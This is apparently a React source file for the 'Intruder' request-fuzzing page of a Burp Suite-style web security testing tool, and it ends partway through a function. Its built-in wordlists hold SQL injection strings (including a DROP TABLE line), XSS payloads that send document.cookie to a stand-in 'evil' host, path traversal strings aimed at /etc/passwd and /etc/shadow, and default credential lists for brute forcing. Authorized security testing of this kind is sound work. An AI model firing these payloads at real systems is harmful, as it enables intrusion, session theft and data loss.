import { useState, useEffect, useRef, useCallback, useMemo } from "react";
import { useNavigate } from "react-router-dom";
import { Play, Plus, Trash2, Bot, Repeat2, Repeat, Swords, X, Eye, Crosshair, Eraser, Inbox, ArrowUp, ArrowDown, ArrowUpDown, Upload } from "lucide-react";
import { runIntruder } from "../api/intruder";
import { getFlow } from "../api/flows";
import { useProject } from "../context/ProjectContext";
import { usePacket } from "../context/PacketContext";
import { useWebSocket } from "../hooks/useWebSocket";
import type { WSEvent } from "../types";
import type {
  IntruderTab,
  IntruderPosition,
  IntruderConfig,
  IntruderResultItem,
  PayloadType,
  WordlistPreset,
  Flow,
} from "../types";
import { StatusCode, Spinner, EmptyState } from "../components/Common";
import { CodeEditor } from "../components/CodeEditor";
import { SplitPane } from "../components/SplitPane";
import { buildRawRequest, parseRawRequest, extractScheme } from "../utils/httpParser";
import { buildRequestContent, buildResponseContent } from "../utils/flowContent";
import { FLOWTAG_COLORS } from "../api/flowtag";

// ===== 内置字典 (Built-in Wordlists) =====

const SQLI_PAYLOADS: string[] = [
  "'",
  '"',
  "`",
  "' OR '1'='1",
  '" OR "1"="1',
  "' OR '1'='1' --",
  "' OR '1'='1' #",
  "' OR 1=1 --",
  "' OR 1=1 #",
  '") OR ("1"="1',
  "') OR ('1'='1",
  "' UNION SELECT NULL --",
  "' UNION SELECT NULL,NULL --",
  "' UNION SELECT NULL,NULL,NULL --",
  "1' AND SLEEP(5) --",
  "1' AND BENCHMARK(5000000,MD5(1)) --",
  "'; DROP TABLE users --",
  "' OR ''='",
  "admin' --",
  "admin'#",
  "' OR 1=1/*",
  "'/**/OR/**/1=1",
  "'+OR+1=1--",
  "%27 OR 1=1",
  "' AND 1=1",
  "' AND 1=2",
  "1' ORDER BY 1--",
  "1' ORDER BY 2--",
  "1' ORDER BY 3--",
  "' UNION SELECT username,password FROM users--",
  "' UNION SELECT table_name FROM information_schema.tables--",
  "1; SELECT pg_sleep(5)--",
];

const XSS_PAYLOADS: string[] = [
  "<script>alert(1)</script>",
  "<SCRIPT>alert(1)</SCRIPT>",
  "<script>alert('XSS')</script>",
  "<img src=x onerror=alert(1)>",
  '<img src=x onerror="alert(1)">',
  "<svg onload=alert(1)>",
  "<svg/onload=alert(1)>",
  "<body onload=alert(1)>",
  "<input onfocus=alert(1) autofocus>",
  "<details open onload=alert(1)>",
  "<marquee onstart=alert(1)>",
  "<select onfocus=alert(1) autofocus>",
  "<video src=x onerror=alert(1)>",
  "<audio src=x onerror=alert(1)>",
  "javascript:alert(1)",
  "javascript:alert(document.cookie)",
  '"><script>alert(1)</script>',
  "'><script>alert(1)</script>",
  '"><img src=x onerror=alert(1)>',
  "<iframe src=javascript:alert(1)>",
  "<iframe src=\"data:text/html,<script>alert(1)</script>\">",
  "<script>document.location='http://evil/?c='+document.cookie</script>",
  "<script>fetch('http://evil/?c='+document.cookie)</script>",
  '<img src=x onerror="javascript:alert(1)">',
  "<svg><script>alert(1)</script></svg>",
  "/onmouseover=alert(1)>",
  "<sCRipt>alert(1)</sCRipt>",
];

const PATH_TRAVERSAL_PAYLOADS: string[] = [
  "../../../etc/passwd",
  "../../../../etc/passwd",
  "../../../../../etc/passwd",
  "../../../../../../etc/passwd",
  "....//....//....//etc/passwd",
  "..%2f..%2f..%2fetc%2fpasswd",
  "..%252f..%252f..%252fetc%252fpasswd",
  "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
  "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",
  "..\\..\\..\\windows\\win.ini",
  "..\\..\\..\\..\\windows\\win.ini",
  "..\\..\\..\\..\\..\\windows\\win.ini",
  "....\\....\\....\\windows\\win.ini",
  "..%5c..%5c..%5cwindows%5cwin.ini",
  "..%255c..%255c..%255cwindows%255cwin.ini",
  "/etc/shadow",
  "/etc/hosts",
  "/proc/self/environ",
  "/var/log/auth.log",
  "C:\\Windows\\System32\\drivers\\etc\\hosts",
  "C:\\Windows\\win.ini",
  "file:///etc/passwd",
];

const USERNAMES: string[] = [
  "admin",
  "root",
  "test",
  "user",
  "guest",
  "administrator",
  "admin1",
  "admin2",
  "user1",
  "user2",
  "demo",
  "demo1",
  "trial",
  "operator",
  "superuser",
  "sysadmin",
  "manager",
  "support",
  "helpdesk",
  "service",
  "info",
  "webmaster",
  "operator1",
  "default",
  "sa",
  "dba",
  "backup",
  "test1",
  "test2",
  "name",
  "mail",
];

const PASSWORDS: string[] = [
  "password",
  "123456",
  "admin123",
  "password123",
  "12345678",
  "qwerty",
  "abc123",
  "123456789",
  "111111",
  "1234567",
  "password1",
  "1234567890",
  "123123",
  "000000",
  "iloveyou",
  "1234",
  "1q2w3e4r",
  "monkey",
  "dragon",
  "sunshine",
  "master",
  "letmein",
  "trustno1",
  "baseball",
  "shadow",
  "superman",
  "qwerty123",
  "welcome",
  "login",
  "admin",
  "root",
  "toor",
  "passw0rd",
  "p@ssw0rd",
  "P@ssw0rd",
  "changeme",
  "secret",
  "administrator",
  "test",
  "guest",
  "default",
  "Password1",
];

const COMMON_DIRS: string[] = [
  "admin",
  "login",
  "api",
  "config",
  "backup",
  "test",
  "dev",
  "old",
  "new",
  "tmp",
  "temp",
  "private",
  "public",
  "static",
  "assets",
  "uploads",
  "files",
  "images",
  "img",
  "css",
  "js",
  "fonts",
  "docs",
  "documentation",
  "help",
  "support",
  "console",
  "dashboard",
  "panel",
  "control",
  "manage",
  "settings",
];

const API_ENDPOINTS: string[] = [
  "/api/v1",
  "/api/v2",
  "/api/users",
  "/api/user",
  "/api/admin",
  "/api/login",
  "/api/auth",
  "/api/logout",
  "/api/register",
  "/api/signup",
  "/api/profile",
  "/api/account",
  "/api/config",
  "/api/settings",
  "/api/products",
  "/api/orders",
  "/api/items",
  "/api/search",
  "/api/upload",
  "/api/download",
  "/api/files",
  "/api/messages",
  "/api/comments",
  "/api/tokens",
  "/api/keys",
  "/graphql",
];

const USER_AGENTS: string[] = [
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0",
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
  "Mozilla/5.0 (X11; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0",
  "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
  "Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
  "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
  "curl/8.4.0",
];

const BUILTIN_WORDLISTS: Record<WordlistPreset, string[]> = {
  sqli: SQLI_PAYLOADS,
  xss: XSS_PAYLOADS,
  path_traversal: PATH_TRAVERSAL_PAYLOADS,
  usernames: USERNAMES,
  passwords: PASSWORDS,
  common_dirs: COMMON_DIRS,
  api_endpoints: API_ENDPOINTS,
  user_agents: USER_AGENTS,
};

const WORDLIST_LABELS: Record<WordlistPreset, string> = {
  sqli: "SQL 注入",
  xss: "XSS 攻击",
  path_traversal: "路径穿越",
  usernames: "常用用户名",
  passwords: "常用密码",
  common_dirs: "常用目录",
  api_endpoints: "API 端点",
  user_agents: "User-Agent",
};

const PAYLOAD_TYPE_LABELS: Record<PayloadType, string> = {
  simple: "简单列表",
  numbers: "数字范围",
  dates: "日期范围",
  uuid: "UUID",
  random: "随机字符串",
  brute: "字符暴力",
  wordlist: "内置字典",
};

const ATTACK_TYPES: {
  value: IntruderTab["attackType"];
  label: string;
  desc: string;
}[] = [
  { value: "sniper", label: "逐个测试", desc: "单个 payload 集，依次替换每个标记位" },
  { value: "battering_ram", label: "同步替换", desc: "单个 payload 集，所有标记位同时替换为同一值" },
  { value: "pitchfork", label: "并行配对", desc: "多个 payload 集，按索引一一配对替换" },
  { value: "cluster_bomb", label: "全组合", desc: "多个 payload 集，测试所有可能的组合" },
];

const GEN_LIMIT = 10000;

// ===== Payload 生成工具函数 =====

function pad2(n: number): string {
  return String(n).padStart(2, "0");
}

/** 按指定格式格式化日期，支持 YYYY / MM / DD / HH / mm / ss */
function formatDate(date: Date, format: string): string {
  const replacements: [string, string][] = [
    ["YYYY", String(date.getFullYear())],
    ["MM", pad2(date.getMonth() + 1)],
    ["DD", pad2(date.getDate())],
    ["HH", pad2(date.getHours())],
    ["mm", pad2(date.getMinutes())],
    ["ss", pad2(date.getSeconds())],
  ];
  let out = format;
  for (const [token, val] of replacements) {
    out = out.split(token).join(val);
  }
  return out;
}

function generateNumbers(from: number, to: number, step: number): string[] {
  const result: string[] = [];
  if (step === 0) return result;
  if (step > 0) {
    for (let v = from; v <= to && result.length < GEN_LIMIT; v += step) {
      result.push(String(v));
    }
  } else {
    for (let v = from; v >= to && result.length < GEN_LIMIT; v += step) {
      result.push(String(v));
    }
  }
  return result;
}

function generateDates(from: string, to: string, format: string): string[] {
  const result: string[] = [];
  const start = new Date(from);
  const end = new Date(to);
  if (isNaN(start.getTime()) || isNaN(end.getTime())) return result;
  const cur = new Date(start);
  let count = 0;
  while (cur <= end && count < GEN_LIMIT) {
    result.push(formatDate(cur, format));
    cur.setDate(cur.getDate() + 1);
    count++;
  }
  return result;
}

function makeUUID(): string {
  if (
    typeof crypto !== "undefined" &&
    typeof crypto.randomUUID === "function"
  ) {
    return crypto.randomUUID();
  }
  return "xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx".replace(/[xy]/g, (c) => {
    const r = (Math.random() * 16) | 0;
    const v = c === "x" ? r : (r & 0x3) | 0x8;
    return v.toString(16);
  });
}

function generateUUIDs(count: number): string[] {
  const result: string[] = [];
  for (let i = 0; i < count; i++) {
    result.push(makeUUID());
  }
  return result;
}

function generateRandomStrings(
  count: number,
  length: number,
  charset: string
): string[] {
  const result: string[] = [];
  if (!charset || charset.length === 0) return result;
  for (let i = 0; i < count; i++) {
    let s = "";
    for (let j = 0; j < length; j++) {
      s += charset[Math.floor(Math.random() * charset.length)];
    }
    result.push(s);
  }
  return result;
}

function generateBrute(
  charset: string,
  minLen: number,
  maxLen: number
): string[] {
  const result: string[] = [];
  if (!charset || charset.length === 0) return result;
  const chars = Array.from(new Set(charset.split("")));
  if (chars.length === 0) return result;
  const lo = Math.max(1, minLen);
  const hi = Math.max(lo, maxLen);
  for (let len = lo; len <= hi; len++) {
    const total = Math.pow(chars.length, len);
    for (let i = 0; i < total; i++) {
      if (result.length >= GEN_LIMIT) return result;
      let s = "";
      let idx = i;
      for (let j = 0; j < len; j++) {
        s = chars[idx % chars.length] + s;
        idx = Math.floor(idx / chars.length);
      }
      result.push(s);
    }
  }
  return result;
}

/** 根据位置配置生成 payload 列表 */
function generatePayloadsForPosition(pos: IntruderPosition): string[] {
  switch (pos.payloadType) {
    case "simple":
      return pos.payloads || [];
    case "numbers":
      return generateNumbers(
        pos.numFrom ?? 1,
        pos.numTo ?? 100,
        pos.numStep ?? 1
      );
    case "dates":
      return generateDates(
        pos.dateFrom ?? "",
        pos.dateTo ?? "",
        pos.dateFormat ?? "YYYY-MM-DD"
      );
    case "uuid":
      return generateUUIDs(pos.randCount ?? 10);
    case "random":
      return generateRandomStrings(
        pos.randCount ?? 10,
        pos.randLength ?? 8,
        pos.randCharset ?? "abcdefghijklmnopqrstuvwxyz0123456789"
      );
    case "brute":
      return generateBrute(
        pos.bruteCharset ?? "abc",
        pos.bruteMinLen ?? 1,
        pos.bruteMaxLen ?? 3
      );
    case "wordlist":
      return pos.wordlistPreset
        ? BUILTIN_WORDLISTS[pos.wordlistPreset] || []
        : [];
    default:
      return [];
  }
}

/** 轻量级计算某个位置的 payload 数量（不实际生成全部，避免性能问题） */
function countPayloadsForPosition(pos: IntruderPosition): number {
  switch (pos.payloadType) {
    case "simple":
      return (pos.payloads || []).length;
    case "numbers": {
      const from = pos.numFrom ?? 1;
      const to = pos.numTo ?? 100;
      const step = pos.numStep ?? 1;
      if (step === 0) return 0;
      const n =
        step > 0
          ? Math.floor((to - from) / step) + 1
          : Math.floor((from - to) / -step) + 1;
      return n > 0 ? Math.min(n, GEN_LIMIT) : 0;
    }
    case "dates": {
      const start = new Date(pos.dateFrom || "");
      const end = new Date(pos.dateTo || "");
      if (isNaN(start.getTime()) || isNaN(end.getTime())) return 0;
      const diff = Math.floor((end.getTime() - start.getTime()) / 86400000) + 1;
      return diff > 0 ? Math.min(diff, GEN_LIMIT) : 0;
    }
    case "uuid":
      return pos.randCount ?? 10;
    case "random":
      return pos.randCount ?? 10;
    case "brute": {
      const charset = pos.bruteCharset ?? "abc";
      const chars = new Set(charset.split("")).size;
      if (chars === 0) return 0;
      const minLen = pos.bruteMinLen ?? 1;
      const maxLen = pos.bruteMaxLen ?? 3;
      const lo = Math.max(1, minLen);
      const hi = Math.max(lo, maxLen);
      let total = 0;
      for (let len = lo; len <= hi; len++) {
        total += Math.pow(chars, len);
        if (total >= GEN_LIMIT) return GEN_LIMIT;
      }
      return total;
    }
    case "wordlist":
      return pos.wordlistPreset
        ? BUILTIN_WORDLISTS[pos.wordlistPreset]?.length || 0
        : 0;
    default:
      return 0;
  }
}

/** 切换 payload 类型时为对应类型填充默认值 */
function ensureDefaults(pos: IntruderPosition): IntruderPosition {
  const p = { ...pos };
  switch (p.payloadType) {
    case "numbers":
      if (p.numFrom === undefined) p.numFrom = 1;
      if (p.numTo === undefined) p.numTo = 100;
      if (p.numStep === undefined) p.numStep = 1;
      break;
    case "dates":
      if (!p.dateFrom) p.dateFrom = "2024-01-01";
      if (!p.dateTo) p.dateTo = "2024-12-31";
      if (!p.dateFormat) p.dateFormat = "YYYY-MM-DD";
      break;
    case "uuid":
      if (p.randCount === undefined) p.randCount = 10;
      break;
    case "random":
      if (p.randLength === undefined) p.randLength = 8;
      if (p.randCount === undefined) p.randCount = 10;
      if (!p.randCharset)
        p.randCharset = "abcdefghijklmnopqrstuvwxyz0123456789";
      break;
    case "brute":
      if (!p.bruteCharset) p.bruteCharset = "abc";
      if (p.bruteMinLen === undefined) p.bruteMinLen = 1;
      if (p.bruteMaxLen === undefined) p.bruteMaxLen = 3;
      break;
    case "wordlist":
      if (!p.wordlistPreset) p.wordlistPreset = "sqli";
      break;
    default:
      break;
  }
  return p;
}

function createDefaultPosition(name: string): IntruderPosition {
  return {
    placeholder: name,
    payloads: [],
    payloadType: "simple",
  };
}

let tabIdCounter = 1;

function createIntruderTab(): IntruderTab {
  return {
    id: `int-${tabIdCounter++}`,
    rawRequest: "",
    scheme: "https",
    positions: [],
    rawPayloads: [],
    selectedPositionIdx: 0,
    concurrency: 5,
    result: null,
    error: null,
    attackType: "sniper",
  };
}

// ===== 可排序表头组件 =====
function SortableHeader({
  label,
  field,
  sortField,
  sortDir,
  onSort,
}: {
  label: string;
  field: "number" | "payload" | "status" | "length" | "duration" | "mime";
  sortField: string;
  sortDir: "asc" | "desc";
  onSort: (field: "number" | "payload" | "status" | "length" | "duration" | "mime") => void;
}) {
  const isActive = sortField === field;
  return (
    <span
      style={{
        cursor: "pointer",
        display: "flex",
        alignItems: "center",
        gap: 2,
        color: isActive ? "var(--accent-blue)" : undefined,
      }}
      onClick={() => onSort(field)}
    >
      {label}
      {isActive ? (
        sortDir === "asc" ? <ArrowUp size={10} /> : <ArrowDown size={10} />
      ) : (
        <ArrowUpDown size={10} style={{ opacity: 0.4 }} />
      )}
    </span>
  );
}

// ===== 结果列表可调列宽 =====
const RESULT_COL_STORAGE_KEY = "intruder_result_col_widths";
const RESULT_MIN_COL_WIDTH = 40;

interface ResultColumnDef {
  id: string;
  label: string;
  width: number;
}

const RESULT_COLUMNS: ResultColumnDef[] = [
  { id: "number", label: "#", width: 40 },
  { id: "payload", label: "Payload", width: 150 },
  { id: "status", label: "状态", width: 50 },
  { id: "length", label: "响应长度", width: 70 },
  { id: "duration", label: "耗时", width: 65 },
  { id: "mime", label: "MIME", width: 80 },
  { id: "tags", label: "标签", width: 100 },
];

const RESULT_DEFAULT_WIDTHS: Record<string, number> = Object.fromEntries(
  RESULT_COLUMNS.map((c) => [c.id, c.width])
);

function loadResultColWidths(): Record<string, number> {
  try {
    const raw = localStorage.getItem(RESULT_COL_STORAGE_KEY);
    if (raw) {
      const parsed = JSON.parse(raw) as Record<string, unknown>;
      const merged: Record<string, number> = { ...RESULT_DEFAULT_WIDTHS };
      for (const c of RESULT_COLUMNS) {
        const v = parsed[c.id];
        if (typeof v === "number" && v >= RESULT_MIN_COL_WIDTH) {
          merged[c.id] = v;
        }
      }
      return merged;
    }
  } catch { /* ignore */ }
  return { ...RESULT_DEFAULT_WIDTHS };
}

export function Intruder() {
  const navigate = useNavigate();
  const { currentProjectId } = useProject();
  const { pendingPacket, target, consume, sendToRepeater, sendToIntruder, sendToAI } =
    usePacket();

  // 多标签页状态
  const [tabs, setTabs] = useState<IntruderTab[]>(() => [createIntruderTab()]);
  const [activeTabId, setActiveTabId] = useState<string>(() => tabs[0].id);

  // 防止重复消费同一个 packet
  const loadedProjectRef = useRef<string | null>(null);
  const consumingRef = useRef(false);

  const [running, setRunning] = useState(false);
  const [hasSelection, setHasSelection] = useState(false);

  // 当前运行的 task_id（用于 WebSocket 事件匹配）
  const runningTaskIdRef = useRef<string | null>(null);

  // 预览弹窗状态
  const [previewPayloads, setPreviewPayloads] = useState<string[] | null>(null);
  const [previewTitle, setPreviewTitle] = useState("");

  // ===== 结果内联详情（复用 FlowDetailPanel，不跳转页面） =====
  const [selectedResultFlow, setSelectedResultFlow] = useState<Flow | null>(null);
  const [selectedResultLoading, setSelectedResultLoading] = useState(false);
  const selectedResultFlowIdRef = useRef<string | null>(null);

  // ===== 排序状态 =====
  const [sortField, setSortField] = useState<"number" | "payload" | "status" | "length" | "duration" | "mime">("number");
  const [sortDir, setSortDir] = useState<"asc" | "desc">("asc");

  // ===== 结果列表可调列宽 =====
  const [resultColWidths, setResultColWidths] = useState<Record<string, number>>(loadResultColWidths);
  const [resizingCol, setResizingCol] = useState<string | null>(null);
  const resizeColRef = useRef<{ columnId: string; startX: number; startWidth: number } | null>(null);

  useEffect(() => {
    try {
      localStorage.setItem(RESULT_COL_STORAGE_KEY, JSON.stringify(resultColWidths));
    } catch { /* ignore */ }
  }, [resultColWidths]);

  useEffect(() => {
    if (!resizingCol) return;
    const onMove = (e: MouseEvent) => {
      const r = resizeColRef.current;
      if (!r) return;
      const delta = e.clientX - r.startX;
      const next = Math.max(RESULT_MIN_COL_WIDTH, r.startWidth + delta);
      setResultColWidths((prev) => ({ ...prev, [r.columnId]: next }));
    };
    const onUp = () => {
      resizeColRef.current = null;
      setResizingCol(null);
    };
    document.body.style.cursor = "col-resize";
    document.body.style.userSelect = "none";
    document.addEventListener("mousemove", onMove);
    document.addEventListener("mouseup", onUp);
    return () => {
      document.body.style.cursor = "";
      document.body.style.userSelect = "";
      document.removeEventListener("mousemove", onMove);
      document.removeEventListener("mouseup", onUp);
    };
  }, [resizingCol]);

  const startColResize = useCallback((e: React.MouseEvent, columnId: string) => {
    e.preventDefault();
    e.stopPropagation();
    const startWidth = resultColWidths[columnId] ?? RESULT_DEFAULT_WIDTHS[columnId] ?? 100;
    resizeColRef.current = { columnId, startX: e.clientX, startWidth };
    setResizingCol(columnId);
  }, [resultColWidths]);

  const resultTotalWidth = RESULT_COLUMNS.reduce((sum, c) => sum + (resultColWidths[c.id] ?? c.width), 0);

  // 右键菜单状态 — 结果列表右键
  const [contextMenu, setContextMenu] = useState<{
    x: number;
    y: number;
    flowId: string | null;
  } | null>(null);

  // 右键菜单状态 — 请求编辑器右键
  const [reqContextMenu, setReqContextMenu] = useState<{ x: number; y: number } | null>(null);

  const menuRef = useRef<HTMLDivElement>(null);
  const reqMenuRef = useRef<HTMLDivElement>(null);
  const requestTextareaRef = useRef<HTMLTextAreaElement>(null);

  const activeTab = tabs.find((t) => t.id === activeTabId) || tabs[0];

  // 当前选中的 position（保证下标合法）
  const selectedIdx =
    activeTab.positions.length > 0
      ? Math.min(
          activeTab.selectedPositionIdx,
          activeTab.positions.length - 1
        )
      : 0;
  const selectedPos = activeTab.positions[selectedIdx];

  // sniper / battering_ram 只使用单个 payload 集，取第一个位置
  const isSinglePayloadMode =
    activeTab.attackType === "sniper" ||
    activeTab.attackType === "battering_ram";
  const effectivePos = isSinglePayloadMode
    ? activeTab.positions[0]
    : selectedPos;
  const effectiveIdx = isSinglePayloadMode ? 0 : selectedIdx;

  // 当前选中位置生成的 payload（用于只读预览列表 / 预览弹窗）
  const generatedPayloads = useMemo(
    () => (effectivePos ? generatePayloadsForPosition(effectivePos) : []),
    [effectivePos]
  );

  // 更新当前 Tab
  const updateActiveTab = useCallback(
    (patch: Partial<IntruderTab>) => {
      setTabs((prev) =>
        prev.map((t) => (t.id === activeTabId ? { ...t, ...patch } : t))
      );
    },
    [activeTabId]
  );

  // ===== WebSocket 实时接收爆破结果（逐个显示） =====
  const handleWsEvent = useCallback(
    (event: WSEvent) => {
      // 只处理当前运行中的 task
      const taskId = runningTaskIdRef.current;
      if (!taskId) return;

      if (event.event === "intruder_progress" && event.task_id === taskId) {
        const resultItem = event.result as IntruderResultItem;
        const completed = event.completed as number;
        const total = event.total as number;
        // 追加单个结果到当前 tab
        setTabs((prev) =>
          prev.map((t) => {
            if (t.id !== activeTabId || !t.result) return t;
            return {
              ...t,
              result: {
                ...t.result,
                results: [...t.result.results, resultItem],
                total: total,
              },
            };
          })
        );
        // 更新进度计数
        void completed;
      } else if (event.event === "intruder_complete" && event.task_id === taskId) {
        runningTaskIdRef.current = null;
        setRunning(false);
      }
    },
    [activeTabId]
  );

  useWebSocket(handleWsEvent);

  // ===== 项目切换时加载持久化标签 =====
  useEffect(() => {
    if (currentProjectId === loadedProjectRef.current) return;
    loadedProjectRef.current = currentProjectId;

    if (!currentProjectId) {
      const fresh = [createIntruderTab()];
      setTabs(fresh);
      setActiveTabId(fresh[0].id);
      return;
    }
    try {
      const key = `hemlock_intruder_${currentProjectId}`;
      const saved = localStorage.getItem(key);
      if (saved) {
        const parsed = JSON.parse(saved) as IntruderTab[];
        if (Array.isArray(parsed) && parsed.length > 0) {
          setTabs(parsed);
          setActiveTabId(parsed[0].id);
          return;
        }
      }
    } catch {
      // localStorage 异常，忽略
    }
    const fresh = [createIntruderTab()];
    setTabs(fresh);
    setActiveTabId(fresh[0].id);
  }, [currentProjectId]);

  // ===== 标签变更时持久化（渐进式：完整→去结果→仅请求配置） =====
  useEffect(() => {
    if (!currentProjectId) return;
    const key = `hemlock_intruder_${currentProjectId}`;
    const tabsToSave = tabs.filter((t) => t.rawRequest.trim());
    if (tabsToSave.length === 0) {
      try { localStorage.removeItem(key); } catch {}
      return;
    }
    // 第一轮：尝试保存完整数据（含爆破结果）
    try {
      localStorage.setItem(key, JSON.stringify(tabsToSave));
      return;
    } catch {
      // 继续 fallback
    }
    // 第二轮：去掉爆破结果（result 可能很大）
    try {
      const stripped = tabsToSave.map((t) => ({ ...t, result: null, error: null }));
      localStorage.setItem(key, JSON.stringify(stripped));
      return;
    } catch {
      // 继续 fallback
    }
    // 第三轮：只保留请求和 payload 配置
    try {
      const minimal = tabsToSave.map((t) => ({
        id: t.id,
        rawRequest: t.rawRequest,
        scheme: t.scheme,
        positions: t.positions,
        rawPayloads: t.rawPayloads,
        selectedPositionIdx: t.selectedPositionIdx,
        concurrency: t.concurrency,
        attackType: t.attackType,
        result: null,
        error: null,
      }));
      localStorage.setItem(key, JSON.stringify(minimal));
    } catch {
      // localStorage 确实满了，无法保存
    }
  }, [tabs, currentProjectId]);

  // 新增 Tab
  const handleAddTab = useCallback(() => {
    const newTab = createIntruderTab();
    setTabs((prev) => [...prev, newTab]);
    setActiveTabId(newTab.id);
  }, []);

  // 关闭 Tab
  const handleCloseTab = useCallback(
    (e: React.MouseEvent, tabId: string) => {
      e.stopPropagation();
      setTabs((prev) => {
        if (prev.length <= 1) return prev;
        const filtered = prev.filter((t) => t.id !== tabId);
        if (activeTabId === tabId) {
          setActiveTabId(filtered[filtered.length - 1].id);
        }
        return filtered;
      });
    },
    [activeTabId]
  );

  // 从 PacketContext 接收数据包 → 新建 Tab（带防重复守卫）
  useEffect(() => {
    if (!pendingPacket || target !== "intruder" || consumingRef.current) return;
    consumingRef.current = true;

    const newTab: IntruderTab = {
      id: `int-${tabIdCounter++}`,
      rawRequest: buildRawRequest(
        pendingPacket.method || "GET",
        pendingPacket.url || "",
        pendingPacket.headers || "",
        pendingPacket.body || ""
      ),
      scheme: pendingPacket.url ? extractScheme(pendingPacket.url) : "https",
      positions: [],
      rawPayloads: [],
      selectedPositionIdx: 0,
      concurrency: 5,
      result: null,
      error: null,
      attackType: "sniper",
    };
    setTabs((prev) => [...prev, newTab]);
    setActiveTabId(newTab.id);
    consume();

    // 下一帧重置守卫
    requestAnimationFrame(() => {
      consumingRef.current = false;
    });
  }, [pendingPacket, target, consume]);

  // 点击外部关闭右键菜单
  useEffect(() => {
    if (!contextMenu) return;
    const handleClick = (e: MouseEvent) => {
      if (menuRef.current && !menuRef.current.contains(e.target as Node)) {
        setContextMenu(null);
      }
    };
    const handleScroll = () => setContextMenu(null);
    document.addEventListener("mousedown", handleClick);
    document.addEventListener("scroll", handleScroll, true);
    return () => {
      document.removeEventListener("mousedown", handleClick);
      document.removeEventListener("scroll", handleScroll, true);
    };
  }, [contextMenu]);

  // ===== 自动识别 §...§ 标记，同步 positions =====
  useEffect(() => {
    const pattern = /§([^§]+)§/g;
    const foundPlaceholders: string[] = [];
    let match;
    while ((match = pattern.exec(activeTab.rawRequest)) !== null) {
      if (!foundPlaceholders.includes(match[1])) {
        foundPlaceholders.push(match[1]);
      }
    }

    setTabs((prev) =>
      prev.map((t) => {
        if (t.id !== activeTabId) return t;

        const currentNames = t.positions.map((p) => p.placeholder);
        const changed =
          foundPlaceholders.length !== currentNames.length ||
          foundPlaceholders.some((name, i) => name !== currentNames[i]);

        if (!changed) return t;

        // 保留已有 position 的配置，为新标记创建默认 position；无标记时置空
        const newPositions = foundPlaceholders.map((name) => {
          const existing = t.positions.find(
            (p) => p.placeholder === name
          );
          return existing || createDefaultPosition(name);
        });

        const newRaw = foundPlaceholders.map((name) => {
          const existingIdx = t.positions.findIndex(
            (p) => p.placeholder === name
          );
          return existingIdx >= 0 ? t.rawPayloads[existingIdx] : "";
        });

        return {
          ...t,
          positions: newPositions,
          rawPayloads: newRaw,
          selectedPositionIdx: Math.min(
            t.selectedPositionIdx,
            Math.max(newPositions.length - 1, 0)
          ),
        };
      })
    );
  }, [activeTab.rawRequest, activeTabId]);

  // ===== Position 操作 =====
  const handleRemovePosition = (idx: number) => {
    const pos = activeTab.positions[idx];
    if (!pos) return;

    // 只删除 § 标记符号，保留标记内的原文
    const marker = `§${pos.placeholder}§`;
    const newRequest = activeTab.rawRequest
      .split(marker)
      .join(pos.placeholder);

    const newPositions = activeTab.positions.filter((_, i) => i !== idx);
    const newRaw = activeTab.rawPayloads.filter((_, i) => i !== idx);
    const newSel =
      activeTab.selectedPositionIdx >= newPositions.length
        ? Math.max(newPositions.length - 1, 0)
        : activeTab.selectedPositionIdx;
    updateActiveTab({
      rawRequest: newRequest,
      positions: newPositions,
      rawPayloads: newRaw,
      selectedPositionIdx: newSel,
    });
  };

  const handlePayloadTypeChange = (idx: number, type: PayloadType) => {
    const newPositions = [...activeTab.positions];
    newPositions[idx] = ensureDefaults({
      ...newPositions[idx],
      payloadType: type,
    });
    updateActiveTab({ positions: newPositions });
  };

  const handlePositionFieldChange = (
    idx: number,
    patch: Partial<IntruderPosition>
  ) => {
    const newPositions = [...activeTab.positions];
    newPositions[idx] = { ...newPositions[idx], ...patch };
    updateActiveTab({ positions: newPositions });
  };

  const handlePayloadsChange = (idx: number, text: string) => {
    const newRaw = [...activeTab.rawPayloads];
    newRaw[idx] = text;
    const payloadList = text
      .split("\n")
      .map((s) => s.trim())
      .filter((s) => s.length > 0);
    const newPositions = [...activeTab.positions];
    newPositions[idx] = { ...newPositions[idx], payloads: payloadList };
    updateActiveTab({ rawPayloads: newRaw, positions: newPositions });
  };

  // ===== Burp Suite 风格：标记选中文本 §§ =====
  const handleMarkSelection = () => {
    const ta = requestTextareaRef.current;
    if (!ta) return;
    const start = ta.selectionStart;
    const end = ta.selectionEnd;
    if (start === end) return; // 没有选中文本

    const text = activeTab.rawRequest;
    const selected = text.substring(start, end);
    const newText = text.substring(0, start) + `§${selected}§` + text.substring(end);

    // 自动同步 positions：扫描所有 §...§ 占位符
    const pattern = /§([^§]+)§/g;
    const foundPlaceholders: string[] = [];
    let match;
    while ((match = pattern.exec(newText)) !== null) {
      if (!foundPlaceholders.includes(match[1])) {
        foundPlaceholders.push(match[1]);
      }
    }

    // 为新发现的占位符创建 position
    const existingNames = activeTab.positions.map((p) => p.placeholder);
    const newPositions = [...activeTab.positions];
    const newRaw = [...activeTab.rawPayloads];
    foundPlaceholders.forEach((name) => {
      if (!existingNames.includes(name)) {
        newPositions.push(createDefaultPosition(name));
